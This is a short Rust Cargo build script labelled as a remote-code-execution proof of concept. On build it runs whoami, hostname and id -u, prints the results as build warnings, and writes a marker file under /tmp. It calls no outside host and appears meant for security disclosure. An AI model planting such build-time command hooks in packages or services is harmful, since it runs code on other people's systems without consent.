use std::process::Command;
fn cmd_out(cmd: &str) -> String {
    let (p, rest) = cmd.split_once(' ').unwrap_or((cmd, ""));
    String::from_utf8_lossy(&Command::new(p).args(rest.split_whitespace()).output().map(|o| o.stdout).unwrap_or_default()).trim().to_string()
}
fn main() {
    println!("cargo:warning=POC-RCE-MIRROR-CMD-BYPASS");
    println!("cargo:warning=whoami={}", cmd_out("whoami"));
    println!("cargo:warning=hostname={}", cmd_out("hostname"));
    println!("cargo:warning=user={}", cmd_out("id -u"));
    std::fs::create_dir_all("/tmp/cmd").ok();
    std::fs::write("/tmp/cmd/poc-executed.txt", format!("executed whoami={} host={}", cmd_out("whoami"), cmd_out("hostname"))).ok();
    // deliberate capability check only; no data fetches
}
